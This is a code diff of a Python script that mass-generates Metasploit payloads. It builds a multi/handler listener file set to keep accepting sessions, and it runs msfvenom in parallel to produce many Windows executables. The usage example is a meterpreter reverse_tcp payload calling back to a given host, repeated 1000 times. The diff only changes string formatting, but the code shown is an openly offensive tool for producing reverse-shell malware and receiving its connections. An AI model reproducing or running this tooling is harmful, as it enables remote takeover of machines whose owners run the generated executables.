@@ -14,8 +14,8 @@ from multiprocessing import Pool
 def build(payload,lhost,lport):
     try:
         options = "use multi/handler\n"
-        options += "set payload %s\n" % (payload)
-        options += "set LHOST %s\nset LPORT %s\n" % (lhost,lport)
+        options += "set payload {0}\n".format(payload)
+        options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
         options += "set ExitOnSession false\n"
         options += "exploit -j\n"
         filewrite = file("listener.rc", "w")
@@ -38,7 +38,7 @@ def multi(payload,lhost,lport,num):
     try:
         commands = []
         for x in range(0, int(num)):      
-            venom = "msfvenom -p %s LHOST=%s LPORT=%s -f exe > payload_%s_%s" % (payload,lhost,lport,lport,x)
+            venom = "msfvenom -p {0} LHOST={1} LPORT={2} -f exe > payload_{3}_{4}".format(payload,lhost,lport,lport,x)
             commands.append(venom)       
         pool = Pool(processes=15)
         run = pool.map(generate, commands)
@@ -64,5 +64,5 @@ if __name__ == '__main__':
 
     #index error
     except IndexError:
-        print "python GenPayloads.py payload lhost lport number [build]"
+        print "python GenPayloads.py payload lhost lport number build"
         print "ex: python GenPayloads.py windows/meterpreter/reverse_tcp 192.168.1.2 443 1000 yes"
